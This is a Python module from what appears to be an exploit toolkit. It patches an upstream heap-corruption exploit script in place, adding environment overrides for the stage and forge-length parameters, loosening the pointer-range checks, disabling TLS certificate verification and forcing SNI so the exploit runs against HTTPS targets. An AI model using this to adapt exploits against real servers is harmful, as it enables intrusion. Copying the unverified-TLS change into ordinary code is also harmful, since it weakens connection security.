#!/usr/bin/env python3
"""Runtime changes applied to the fetched upstream exploit.

The upstream repository has no explicit license, so its source is not vendored
and no patch file is redistributed. The toolkit applies the minimal changes in
place: SNI on HTTPS and environment overrides for the heap parameters. The same
changes are documented in docs/upstream-changes.md for manual use.
"""

from __future__ import annotations

import os


def _read(repo: str) -> tuple[str, str] | None:
    path = os.path.join(repo, "exploit.py")
    try:
        with open(path, encoding="utf-8") as fh:
            return path, fh.read()
    except OSError:
        return None


def patch_params(repo: str) -> bool:
    """Inject P2S_STAGE1_N / P2S_FORGE_LEN / P2S_STAGE2_T / P2S_STAGE2_V."""
    found = _read(repo)
    if not found:
        return False
    path, source = found
    if "P2S_STAGE1_N" in source:
        return False
    anchor = "            self.stage3_carrier = False\n"
    if anchor not in source:
        return False
    inject = anchor + (
        "        import os as _os\n"
        "        self.stage1_n = int(_os.environ.get('P2S_STAGE1_N', self.stage1_n))\n"
        "        self.stage1_forge_len = int(_os.environ.get('P2S_FORGE_LEN', 79))\n"
        "        self.stage2_t = int(_os.environ.get('P2S_STAGE2_T', self.stage2_t))\n"
        "        self.stage2_v = int(_os.environ.get('P2S_STAGE2_V', self.stage2_v))\n")
    source = source.replace(anchor, inject, 1)
    source = source.replace('forge = bytearray(b"A" * 79)',
                            'forge = bytearray(b"A" * self.stage1_forge_len)')
    source = source.replace('if 0x7F0000000000 <= v < 0x800000000000:',
                            'if 0x10000 < v < 0x0001000000000000:')
    source = source.replace('if not (0x7F0000000000 <= p < 0x800000000000):',
                            'if not (0x10000 < p < 0x0001000000000000):')
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(source)
    return True


def patch_tls(repo: str) -> bool:
    """Accept the lab certificate and always send SNI.

    Some HTTPS servers (and CDNs) answer a handshake without SNI with
    TLSV1_ALERT_INTERNAL_ERROR; keeping server_hostname is required.
    """
    found = _read(repo)
    if not found:
        return False
    path, source = found
    original = source
    source = source.replace("ctx = ssl.create_default_context()",
                            "ctx = ssl._create_unverified_context()")
    source = source.replace("s = ctx.wrap_socket(s)",
                            "s = ctx.wrap_socket(s, server_hostname=self.host)")
    if source == original:
        return False
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(source)
    return True
